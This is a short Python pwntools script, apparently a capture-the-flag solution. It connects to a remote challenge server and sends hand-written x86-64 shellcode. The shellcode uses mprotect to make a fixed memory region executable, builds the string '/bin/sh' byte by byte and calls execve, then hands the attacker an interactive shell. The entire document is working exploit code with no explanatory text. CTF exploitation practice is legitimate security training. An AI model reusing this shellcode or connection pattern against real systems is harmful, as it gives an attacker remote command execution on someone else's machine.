from pwn import *

context.binary = elf = ELF('chal')
#pr = process()
pr = remote('45.55.47.125', 32644)
base = 0xDEADBEEF000
shellcode = asm(f'''
                mov rdi,0xDEADBEEF000
                mov rsi,0x1000
                mov rdx,7
                mov rax,0xa
                syscall
                mov rdi, {0xDEADBEEF000+300}
                mov byte ptr[rdi+7],0
                mov byte ptr[rdi+6],0x68
                mov byte ptr[rdi+5],0x73
                mov byte ptr[rdi+4],0x2f
                mov byte ptr[rdi+3],0x6e
                mov byte ptr[rdi+2],0x69
                mov byte ptr[rdi+1],0x62
                mov byte ptr[rdi],0x2f
                mov rsi,0
                mov rdx,0
                mov rax,0x3b
                syscall
                ''')
#print(len(shellcode))
#gdb.attach(pr)
pr.sendline(shellcode)
pr.interactive()